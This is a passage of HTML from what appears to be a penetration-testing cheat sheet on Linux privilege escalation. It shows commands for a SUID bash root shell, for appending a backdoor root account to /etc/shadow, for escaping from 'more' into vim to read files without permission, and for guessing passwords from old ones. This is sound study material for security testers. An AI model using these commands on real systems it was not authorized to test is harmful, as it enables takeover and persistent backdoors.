    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="use-the-set-user-id-(suid)" tabindex="-1"><a href="#use-the-set-user-id-(suid)" class="header-anchor">Use the Set User ID (SUID)</a></h3>
<p>If you can change permission of the <strong>/bin/bash</strong> , add <strong>SUID</strong> to the file.</p>
<pre class="codecopy_pre codecopy_pre_42"><code class="language-sh hljs language-bash"><span class="syntax-built_in">chmod</span> 4755 /bin/bash
</code><button class="codecopy_copy" data-codecopy="42">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Then you execute it as root privilege by adding "-p" option.<br>
You'll be able to pwn the target shell.</p>
<pre class="codecopy_pre codecopy_pre_43"><code class="language-sh hljs language-bash">user@machine:~/$ /bin/bash -p
root@machine:~/$ <span class="syntax-built_in">whoami</span>
root
</code><button class="codecopy_copy" data-codecopy="43">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="update-sensitive-information" tabindex="-1"><a href="#update-sensitive-information" class="header-anchor">Update Sensitive Information</a></h2>
<h3 id="1.-change-password-of-current-user" tabindex="-1"><a href="#1.-change-password-of-current-user" class="header-anchor">1. Change Password of Current User</a></h3>
<p>We need to know the current user's password.</p>
<pre class="codecopy_pre codecopy_pre_44"><code class="language-sh hljs language-bash"><span class="syntax-built_in">echo</span> -n <span class="syntax-string">'&lt;current-password&gt;\n&lt;new-password&gt;\n&lt;new-password&gt;'</span> | passwd
</code><button class="codecopy_copy" data-codecopy="44">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="2.-add-another-root-user-to-%2Fetc%2Fshadow" tabindex="-1"><a href="#2.-add-another-root-user-to-%2Fetc%2Fshadow" class="header-anchor">2. Add Another Root User to /etc/shadow</a></h3>
<ol>
<li>
<p><strong>Generate New Password</strong></p>
<pre class="codecopy_pre codecopy_pre_45"><code class="language-sh hljs language-bash"><span class="syntax-comment"># -6: SHA512</span>
openssl passwd -6 -salt salt password
</code><button class="codecopy_copy" data-codecopy="45">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Copy the output hash.</p>
</li>
<li>
<p><strong>Add New Line to /etc/shadow in Target Machine</strong></p>
<p>You need to do as root privileges.</p>
<pre class="codecopy_pre codecopy_pre_46"><code class="language-sh hljs language-bash"><span class="syntax-built_in">echo</span> <span class="syntax-string">'&lt;new-user-name&gt;:&lt;generated-password-hash&gt;:19115:0:99999:7:::'</span> &gt;&gt; /etc/shadow
</code><button class="codecopy_copy" data-codecopy="46">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
<li>
<p><strong>Switch to New User</strong></p>
<p>To confirm, switch to generated new user.</p>
<pre class="codecopy_pre codecopy_pre_47"><code class="language-sh hljs language-bash">su &lt;new-user&gt;
</code><button class="codecopy_copy" data-codecopy="47">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
</ol>
<br>
<h2 id="display-the-content-of-files-you-don't-have-permissions" tabindex="-1"><a href="#display-the-content-of-files-you-don't-have-permissions" class="header-anchor">Display the Content of Files You Don't Have Permissions</a></h2>
<p>Using <strong>"more"</strong> command.</p>
<h3 id="1.-make-the-terminal's-window-size-smaller" tabindex="-1"><a href="#1.-make-the-terminal's-window-size-smaller" class="header-anchor">1. Make the Terminal's Window Size Smaller</a></h3>
<h3 id="2.-run-%22more%22-command" tabindex="-1"><a href="#2.-run-%22more%22-command" class="header-anchor">2. Run "more" Command</a></h3>
<p>The text like "--More--(60%)" will be appeared.</p>
<h3 id="3.-press-'v'-on-keyboard-to-enter-vim-mode" tabindex="-1"><a href="#3.-press-'v'-on-keyboard-to-enter-vim-mode" class="header-anchor">3. Press 'v' on Keyboard to Enter Vim Mode</a></h3>
<h3 id="4.-enter-'%3Ae-~%2Fsomefile'" tabindex="-1"><a href="#4.-enter-'%3Ae-~%2Fsomefile'" class="header-anchor">4. Enter ':e ~/somefile'</a></h3>
<br>
<h2 id="password-guessing-from-old-one" tabindex="-1"><a href="#password-guessing-from-old-one" class="header-anchor">Password Guessing from Old One</a></h2>
<pre class="codecopy_pre codecopy_pre_48"><code class="language-sh hljs language-bash">password2021 -&gt; password2022, password2023
april123 -&gt; may123, june123
apple -&gt; banana, orange
</code><button class="codecopy_copy" data-codecopy="48">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>

            </div>
            <div class="my-6 p-4">
                <h2 class="text-3xl font-bold border-b-[1px] border-pink-dark">References</h2>
                <ul class="my-6 ml-4 list-disc">
                    
                        <li class="my-2">
                            <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" class="text-base text-pink-light hover:brightness-200">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</a>
                        </li>
                    
                </ul>
            </div>
        </article>
    </div>

    
    <div id="exploit-rightside-inner" class="hidden sm:block w-full h-screen overflow-y-auto px-2 py-3">
        <div class="">
            <div class="">
                <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-60">Tools by Muhammd</h4>
                <div class="my-4">
                    <div class="my-2">
                        <a href="https://github.com/muhammd/muhammd" target="_blank" rel="noopener noreferrer" class="text-base text-pink-light hover:brightness-200">
                            RedTeam Repos
                        </a>
                        <p class="text-sm">Automatic PenTest Scripts</p>
                    </div>
                    <div class="my-2">
                        <a href="https://github.com/muhammd/autorecon" target="_blank" rel="noopener noreferrer" class="text-base text-pink-light hover:brightness-200">
                            AutoRecon
                        </a>
                        <p class="text-sm">Auto reconnaissance CLI.</p>
                    </div>
                    <div class="my-2">
                        <a href="https://PenTest.Tools/" target="_blank" rel="noopener noreferrer" class="text-base text-pink-light hover:brightness-200">
                            PenTest Tools 
                        </a>
                        <p class="text-sm">PenTest Tools</p>
                    </div>
                </div>
            </div>
            <div class="mt-8">
                
                <script async="" type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CWYDE53L&amp;placement=exploit-noteshdksorg" id="_carbonads_js">
                </script>
            </div>
        </div>
    </div>
    
</div>
        </main>

        <footer class="w-full p-8 z-100 bg-navy-light">
            <div class="w-full flex flex-col items-center space-y-2 text-base">
                <div class="flex items-center justify-center space-x-2">
                    <a href="/disclaimer" class="text-pink-light hover:brightness-200">Disclaimer</a>
                    <a href="/privacy-policy" class="text-pink-light hover:brightness-200">Privacy Policy</a>
                </div>
                <hr class="w-[260px] white opacity-30">
                <div class="flex items-center space-x-2">
                    <a href="https://github.com/muhammd/" target="_blank" rel="noopener noreferrer" class="text-pink-light hover:brightness-200">
                        GitHub
                    </a>            
                    <a href="https://twitter.com/muhammdhaidari" target="_blank" rel="noopener noreferrer" class="text-pink-light hover:brightness-200">
                        Twitter
                    </a>
                </div>
            </div>
        </footer>
    

</body></html>